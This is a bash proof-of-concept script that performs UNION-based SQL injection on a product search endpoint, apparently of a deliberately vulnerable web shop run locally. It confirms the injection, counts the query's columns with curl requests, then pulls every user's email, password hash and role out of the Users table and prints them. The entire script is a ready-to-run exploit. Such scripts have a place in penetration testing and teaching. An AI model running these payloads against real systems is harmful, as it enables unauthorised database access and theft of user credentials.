#!/usr/bin/env bash
# PoC 3: SQL Injection -> Data Exfiltration (UNION) on /rest/products/search
# The `q` search term is interpolated into a raw SQL query (SQLite backend).
# A UNION SELECT reveals the column count (10) and lets us pull arbitrary
# table data: here the entire Users table (email, password hash, role).
set -u
B="${1:-http://host.docker.internal:3000}"

echo "[*] Error-based confirmation that the term is injected raw:"
curl -s -G "$B/rest/products/search" --data-urlencode "q=apple' AND '1'='1" -o /dev/null -w "    quoted term accepted -> HTTP %{http_code}\n"
curl -s -G "$B/rest/products/search" --data-urlencode "q=apple')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM Users--" | grep -o "SQLITE_ERROR[^<]*" | head -1

echo
echo "[*] Enumerating column count (test 8,9,10):"
for n in 8 9 10; do
  sel=$(python3 -c "print(','.join(str(i) for i in range(1,$n+1)))")
  code=$(curl -s -G "$B/rest/products/search" --data-urlencode "q=apple')) UNION SELECT $sel FROM Users--" -o /dev/null -w "%{http_code}")
  echo "    $n columns -> HTTP $code"
done

echo
echo "[*] Extracting email + password hash + role from Users table:"
curl -s -G "$B/rest/products/search" \
  --data-urlencode "q=apple')) UNION SELECT id,email,password,role,5,6,7,8,9,10 FROM Users--" \
  | python3 -c '
import sys, json
rows = json.load(sys.stdin)["data"]
print("    rows returned:", len(rows))
for r in rows:
    print(f"    id={r["id"]:<3} email={r["name"]:<28} pwhash={r["description"]:<33} role={r["price"]}")
'
